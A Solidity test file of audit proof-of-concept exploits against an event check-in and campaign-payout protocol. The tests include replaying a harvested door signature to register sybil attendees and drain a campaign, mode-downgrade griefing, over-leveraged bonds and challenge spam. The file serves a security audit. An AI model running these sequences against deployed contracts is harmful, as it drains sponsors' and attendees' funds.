// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {ShowmarkRegistry} from "../../src/ShowmarkRegistry.sol";
import {CampaignVault} from "../../src/CampaignVault.sol";
import {IShowmarkRegistry} from "../../src/interfaces/IShowmarkRegistry.sol";
import {ICampaignVault} from "../../src/interfaces/ICampaignVault.sol";
import {IOrganizerBond} from "../../src/interfaces/IOrganizerBond.sol";
import {ProtocolFixture} from "../utils/ProtocolFixture.sol";
import {SigUtils} from "../utils/SigUtils.sol";

/// @notice Oracle that answers decimals() correctly but returns a single word from latestRoundData, as a
/// misconfigured or upgraded feed proxy could.
contract ShortAnswerAggregator {
    function decimals() external pure returns (uint8) {
        return 8;
    }

    fallback() external {
        assembly {
            mstore(0, 1)
            return(0, 0x20)
        }
    }
}

/// @notice Proof-of-concept tests for the findings in docs/AUDIT.md. Each test passes when the issue is present.
contract AuditPoCTest is ProtocolFixture {
    uint256 internal constant HONEST_PK = 0x4F4E35;

    /// @dev What anyone can read back from a mined `checkIn` transaction: the calldata carries the door signature.
    function harvestDoorPass(bytes calldata txInput) external pure returns (uint64 issuedAt, bytes memory doorSig) {
        IShowmarkRegistry.CheckInData memory d = abi.decode(txInput[4:], (IShowmarkRegistry.CheckInData));
        return (d.doorTime, d.doorSig);
    }

    function _honestMode1CheckIn() internal returns (uint64 issuedAt, bytes memory doorSig) {
        IShowmarkRegistry.CheckInData memory d = _mode1(eventId, HONEST_PK, doorPk, uint64(block.timestamp));
        _checkIn(d);
        return this.harvestDoorPass(abi.encodeCall(ShowmarkRegistry.checkIn, (d)));
    }

    function _sybil(uint256 pk, uint64 issuedAt, bytes memory doorSig)
        internal
        view
        returns (IShowmarkRegistry.CheckInData memory d)
    {
        d.eventId = eventId;
        d.attendee = vm.addr(pk);
        d.mode = 1;
        d.doorTime = issuedAt;
        d.attendeeSig = SigUtils.sign(pk, SigUtils.checkInDigest(separator, eventId, d.attendee));
        d.doorSig = doorSig;
    }

    // ------------------------------------------------------------------ C-01

    /// A remote attacker who was never at the venue harvests the DoorPass from an honest check-in's calldata and
    /// checks in any number of fresh pass keys with it, then drains a default (mode 1, no QIE ID, no caps) campaign.
    function test_C01_remoteSybilsDrainMode1CampaignWithHarvestedDoorPass() public {
        uint256 campaignId = _createApproved(_params(NATIVE), 21 ether);
        vm.warp(T0 + 10);
        (uint64 issuedAt, bytes memory doorSig) = _honestMode1CheckIn();

        vm.warp(T0 + 10 + MAX_PASS_AGE); // still inside maxPassAge of the harvested pass
        uint256 n = 20;
        IShowmarkRegistry.CheckInData[] memory ds = new IShowmarkRegistry.CheckInData[](n);
        ICampaignVault.SettleItem[] memory items = new ICampaignVault.SettleItem[](n);
        for (uint256 i; i < n; ++i) {
            ds[i] = _sybil(0xBAD000 + i, issuedAt, doorSig);
            items[i] = ICampaignVault.SettleItem(campaignId, eventId, ds[i].attendee);
        }
        address attacker = makeAddr("remoteAttacker");
        vm.prank(attacker);
        uint8[] memory status = registry.checkInBatch(ds);
        for (uint256 i; i < n; ++i) {
            assertEq(status[i], 0, "sybil recorded");
        }

        vm.prank(attacker);
        vault.settleBatch(items);
        uint256 stolen;
        for (uint256 i; i < n; ++i) {
            address pass = ds[i].attendee;
            uint256 before = pass.balance;
            vm.prank(pass);
            vault.withdraw(NATIVE, pass);
            stolen += pass.balance - before;
        }
        assertEq(stolen, 10 ether, "attacker took the attendee share of 20 presences");
        assertEq(vault.campaign(campaignId).balance, 1 ether, "20 of 21 presences paid to sybils");
    }

    /// Same harvested pass fills the event's capacity so real attendees at the door are refused.
    function test_C01_harvestedDoorPassFillsCapacity() public {
        uint256 small = _createEvent(organizer, T0, T0 + EVENT_LENGTH, 5, 0);
        _authorize(organizer, small, doorKey, T0 + EVENT_LENGTH);
        vm.warp(T0 + 10);
        IShowmarkRegistry.CheckInData memory honest = _mode1(small, HONEST_PK, doorPk, uint64(block.timestamp));
        _checkIn(honest);
        for (uint256 i; i < 4; ++i) {
            IShowmarkRegistry.CheckInData memory d = _mode1(small, 0xBAD100 + i, doorPk, honest.doorTime);
            d.doorSig = honest.doorSig; // reused, not re-signed
            _checkIn(d);
        }
        vm.warp(T0 + 20);
        vm.expectRevert(IShowmarkRegistry.AtCapacity.selector);
        _checkIn(_mode1(small, 0x600D, doorPk, uint64(block.timestamp)));
    }

    // ------------------------------------------------------------------ M-01

    /// The attendee's mode 2 code (SM2.{eventId}.{attendee}.{attendeeSig}) is shown openly. Anyone who reads it
    /// combines the attendee signature with a harvested DoorPass and records a mode 1 presence first. The door's
    /// real attestation is then rejected and the attendee can never be paid by a mode 2 campaign.
    function test_M01_modeDowngradeLocksAttendeeOutOfMode2Campaign() public {
        ICampaignVault.CampaignParams memory p = _params(NATIVE);
        p.minProofMode = 2;
        uint256 campaignId = _createApproved(p, 5 ether);

        vm.warp(T0 + 10);
        (uint64 issuedAt, bytes memory doorSig) = _honestMode1CheckIn();

        // Victim's real mode 2 check-in, as the door would submit it
        IShowmarkRegistry.CheckInData memory real = _mode2(eventId, attendeePk, doorPk, uint64(block.timestamp));

        // Griefer reuses the victim's public attendeeSig with the harvested DoorPass
        IShowmarkRegistry.CheckInData memory downgrade;
        downgrade.eventId = eventId;
        downgrade.attendee = attendee;
        downgrade.mode = 1;
        downgrade.doorTime = issuedAt;
        downgrade.attendeeSig = real.attendeeSig;
        downgrade.doorSig = doorSig;
        vm.prank(makeAddr("griefer"));
        registry.checkIn(downgrade);

        vm.expectRevert(IShowmarkRegistry.AlreadyPresent.selector);
        _checkIn(real);
        assertEq(registry.presenceOf(eventId, attendee).mode, 1);
        vm.expectRevert(ICampaignVault.NotPresent.selector);
        vault.settle(campaignId, eventId, attendee);
    }

    // ------------------------------------------------------------------ M-02

    /// One minBond stake qualifies an organizer for every openToBonded campaign at once, while the most the
    /// arbitrator can slash is that one stake.
    function test_M02_singleBondDrainsSeveralOpenCampaigns() public {
        ICampaignVault.CampaignParams memory p = _params(NATIVE);
        p.openToBonded = true;
        p.minBond = 1 ether;
        p.attendeeShareBps = 5000;
        uint256 a = _create(p, 10 ether);
        uint256 b = _create(p, 10 ether);

        address rogue = makeAddr("rogue");
        uint256 rogueDoorPk = 0xD0D0;
        vm.deal(rogue, 1 ether);
        vm.startPrank(rogue);
        bond.bond{value: 1 ether}();
        uint256 ev = registry.createEvent(T0, T0 + 1 hours, 0, 60, 0, META);
        registry.authorizeDoorKey(ev, vm.addr(rogueDoorPk), T0 + 1 hours);
        vm.stopPrank();

        ICampaignVault.SettleItem[] memory items = new ICampaignVault.SettleItem[](20);
        for (uint256 i; i < 10; ++i) {
            IShowmarkRegistry.CheckInData memory d = _mode2(ev, 0x5B11 + i, rogueDoorPk, uint64(block.timestamp));
            _checkIn(d);
            items[2 * i] = ICampaignVault.SettleItem(a, ev, d.attendee);
            items[2 * i + 1] = ICampaignVault.SettleItem(b, ev, d.attendee);
        }
        vault.settleBatch(items);
        vm.prank(rogue);
        bond.requestUnbond(1 ether);

        assertEq(vault.campaign(a).balance + vault.campaign(b).balance, 0, "both campaigns drained");
        assertEq(vault.claimable(NATIVE, rogue), 10 ether, "organizer share alone is 10x the bond");

        vm.prank(sponsor);
        uint256 cid = bond.challenge(rogue, a, "sybil event");
        vm.prank(owner);
        vm.expectRevert(IOrganizerBond.SlashExceedsBond.selector);
        bond.resolve(cid, 2 ether, sponsor);
    }

    // ------------------------------------------------------------------ L-01

    /// A door key used after its validUntil can still back-date mode 2 attestations to its validity window and
    /// have them recorded until endsAt + 3 days.
    function test_L01_expiredDoorKeyBackdatesAttestations() public {
        uint256 volunteerPk = 0x7011;
        uint64 shiftEnd = T0 + 1 hours;
        _authorize(organizer, eventId, vm.addr(volunteerPk), shiftEnd);

        vm.warp(T0 + EVENT_LENGTH + 2 days); // long after the shift and the event
        IShowmarkRegistry.CheckInData memory d = _mode2(eventId, 0xF00D, volunteerPk, shiftEnd);
        assertTrue(_checkIn(d));
        assertEq(registry.presenceOf(eventId, d.attendee).mode, 2);
    }

    // ------------------------------------------------------------------ L-02

    /// A feed that returns malformed data is not caught by try/catch (decoding happens outside it), so the whole
    /// settleBatch reverts, including token-priced items that never read the oracle.
    function test_L02_malformedOracleAnswerRevertsWholeSettleBatch() public {
        ShortAnswerAggregator bad = new ShortAnswerAggregator();
        CampaignVault v = new CampaignVault(
            address(registry), address(qieIdCheck), address(bad), address(bond), MAX_ORACLE_AGE, owner, feeRecipient, 0
        );
        vm.startPrank(sponsor);
        uint256 tokenPriced = v.createCampaign{value: 5 ether}(_params(NATIVE), 5 ether);
        uint256 usdPriced = v.createCampaign{value: 50 ether}(_usdParams(1e6), 50 ether);
        uint256[] memory ids = new uint256[](1);
        ids[0] = eventId;
        v.approveEvents(tokenPriced, ids);
        v.approveEvents(usdPriced, ids);
        vm.stopPrank();
        _checkInNow(eventId, attendeePk);

        ICampaignVault.SettleItem[] memory items = new ICampaignVault.SettleItem[](2);
        items[0] = ICampaignVault.SettleItem(tokenPriced, eventId, attendee);
        items[1] = ICampaignVault.SettleItem(usdPriced, eventId, attendee);
        vm.expectRevert();
        v.settleBatch(items);
        vm.expectRevert();
        v.quote(usdPriced);

        // The token-priced item on its own settles fine: the revert comes only from decoding the feed's answer.
        ICampaignVault.SettleItem[] memory only = new ICampaignVault.SettleItem[](1);
        only[0] = items[0];
        assertEq(v.settleBatch(only)[0], 0);
    }

    // ------------------------------------------------------------------ L-03

    /// Anyone can open a zero-deposit campaign and file unlimited challenges against any organizer; each one
    /// blocks completeUnbond until the Safe resolves it individually.
    function test_L03_challengeSpamLocksAnyOrganizersUnbond() public {
        vm.deal(organizer, 1 ether);
        vm.startPrank(organizer);
        bond.bond{value: 1 ether}();
        bond.requestUnbond(1 ether);
        vm.stopPrank();

        address griefer = makeAddr("griefer");
        vm.startPrank(griefer);
        uint256 cid = vault.createCampaign(_params(NATIVE), 0);
        for (uint256 i; i < 25; ++i) {
            bond.challenge(organizer, cid, "");
        }
        vm.stopPrank();
        assertEq(bond.openChallenges(organizer), 25);

        vm.warp(block.timestamp + 7 days);
        vm.prank(organizer);
        vm.expectRevert(IOrganizerBond.ChallengeOpen.selector);
        bond.completeUnbond();
    }

    // ------------------------------------------------------------------ L-04

    /// A vault pause that runs past endsAt + SETTLE_GRACE permanently voids presences that were earned but not yet
    /// settled; the sponsor then refunds the money owed to them.
    function test_L04_pauseThroughGraceVoidsEarnedPayouts() public {
        uint256 campaignId = _createApproved(_params(NATIVE), 3 ether);
        _checkInNow(eventId, attendeePk);
        vm.prank(owner);
        vault.pause();

        vm.warp(uint256(vault.campaign(campaignId).endsAt) + vault.SETTLE_GRACE() + 1);
        vm.prank(owner);
        vault.unpause();
        vm.expectRevert(ICampaignVault.SettlementClosed.selector);
        vault.settle(campaignId, eventId, attendee);

        vm.prank(sponsor);
        vault.refund(campaignId);
        assertEq(vault.campaign(campaignId).balance, 0);
    }

    // ------------------------------------------------------------------ L-05

    /// Mode 2 presence is dated by the block that records it, not by attestedAt. A door attestation made inside the
    /// campaign window but submitted from the offline queue after the campaign ended is never paid, although the
    /// registry accepts it until endsAt + 3 days.
    function test_L05_offlineQueuedAttestationDatedBySubmission() public {
        ICampaignVault.CampaignParams memory p = _params(NATIVE);
        p.minProofMode = 2;
        p.endsAt = T0 + EVENT_LENGTH; // campaign covers exactly the event
        uint256 campaignId = _createApproved(p, 5 ether);

        uint64 attestedAt = T0 + 30 minutes;
        IShowmarkRegistry.CheckInData memory d = _mode2(eventId, attendeePk, doorPk, attestedAt);

        vm.warp(T0 + EVENT_LENGTH + 2 hours); // door was offline; queue flushes after the event
        assertTrue(_checkIn(d));
        vm.expectRevert(ICampaignVault.OutsideCampaignWindow.selector);
        vault.settle(campaignId, eventId, attendee);
    }

    // ------------------------------------------------------------------ L-06

    /// renounceOwnership is still callable. On the bond it strands every organizer with an open challenge.
    function test_L06_renounceOwnershipStrandsChallengedBond() public {
        vm.deal(organizer, 1 ether);
        vm.startPrank(organizer);
        bond.bond{value: 1 ether}();
        bond.requestUnbond(1 ether);
        vm.stopPrank();
        uint256 cid = _create(_params(NATIVE), 0);
        vm.prank(sponsor);
        bond.challenge(organizer, cid, "");

        vm.prank(owner);
        bond.renounceOwnership();
        assertEq(bond.owner(), address(0));

        vm.warp(block.timestamp + 365 days);
        vm.prank(organizer);
        vm.expectRevert(IOrganizerBond.ChallengeOpen.selector);
        bond.completeUnbond();
        assertEq(address(bond).balance, 1 ether, "locked forever");
    }
}
